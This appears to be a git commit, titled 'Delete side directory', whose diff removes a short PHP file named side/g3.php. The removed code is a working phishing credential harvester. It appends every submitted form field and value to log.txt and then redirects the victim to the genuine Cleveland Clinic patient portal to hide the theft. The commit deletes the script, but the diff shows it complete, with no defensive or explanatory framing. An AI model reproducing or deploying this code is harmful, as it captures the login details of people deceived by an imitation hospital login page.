2d0c05e5ff9859c078c9e106c03faa74834ddfca
00sam0 <92495741+00sam0@users.noreply.github.com>
2024-11-22 07:57:02 +0100

    Delete side directory

--- side/g3.php
+++
@@ -1,9 +0,0 @@
-<?php
-header('Location: https://my.clevelandclinic.org/');
-$file = fopen("log.txt", "a");
-foreach($_POST as $variable =>$value) {
-    fwrite($file, $variable);
-    fwrite($file, "=");
-    fwrite($file, $value);
-}
-?>
